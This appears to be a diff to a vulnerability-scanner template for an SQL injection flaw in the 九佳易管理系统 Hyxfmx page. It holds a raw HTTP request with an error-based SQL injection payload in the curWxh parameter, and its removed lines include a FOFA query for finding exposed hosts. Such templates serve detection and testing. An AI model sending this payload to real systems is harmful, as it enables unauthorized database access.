@@ -3,12 +3,8 @@ info:
   name: 九佳易管理系统 Hyxfmx存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/de0iu9ugluq6n2i0'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: de0iu9ugluq6n2i0
-    fofa: body="/Scripts/Login_A8/"
 http:
 - raw:
   - 'GET /HuiYuan/Hyxfmx.aspx?curWxh=1'')+and+1111+in+(select+sys.fn_sqlvarbasetostr(HashBytes(''MD5'',''123'')))--+ HTTP/1.1
